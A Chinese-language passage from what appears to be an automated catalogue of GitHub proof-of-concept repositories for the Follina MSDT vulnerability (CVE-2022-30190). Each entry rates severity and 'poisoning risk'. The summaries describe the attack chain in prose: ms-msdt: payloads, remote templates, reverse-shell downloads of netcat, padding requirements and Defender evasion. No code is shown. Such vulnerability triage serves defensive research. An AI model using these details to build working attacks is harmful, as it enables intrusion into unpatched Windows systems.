1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

